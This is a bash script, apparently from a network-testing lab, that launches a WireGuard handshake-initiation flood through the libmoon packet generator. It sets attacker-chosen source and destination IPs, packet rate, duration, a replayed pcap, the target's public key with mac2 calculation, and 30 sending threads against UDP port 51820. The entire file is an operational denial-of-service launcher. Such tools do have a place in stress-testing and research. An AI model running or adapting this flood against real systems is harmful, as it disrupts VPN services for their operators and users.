#!/bin/bash

# sudo script.sh <ipSrc> <ipDst> <attackRate> <duration> ...
# e.g.
# sudo bash wg_initmac2_Flood.sh 172.31.116.132 172.31.116.137 1000 10 wg_init.pcap "800nxsP002z/3j08CklD2752VlFYj3I9A+c7mNVIzhM=" 128

# cd to directory of script
scriptDir=$(dirname -- "$(readlink -f -- "$BASH_SOURCE")")
cd "$scriptDir"

# prepare Flood Generator framework
source ../prepFloodGenerator.sh

############## Flood Configuration ##############

ipSrc=$1
ipDst=$2
attackRate=$3
seconds=$4

pcap=$5
pubKey=$6
flows=$7

# more fixed configuration values (adjust if needed)
ethSrc="3c:fd:fe:9e:8e:39"
udpSrc=51820

ethDst="b0:aa:77:2f:ab:1a"
udpDst=51820


############## Flood Start ##############

$libmoonBuild/libmoon wgFlood.lua \
    --seconds $seconds --threads 30 --rate $attackRate \
    --replayPcap $pcap \
    --pubkey $pubKey --calcMac2 \
    --flows $flows \
    --ethSrc $ethSrc --ip4Src $ipSrc --udpSrc $udpSrc \
    --ethDst $ethDst --ip4Dst $ipDst --udpDst $udpDst \
    --startConfirmation \
    0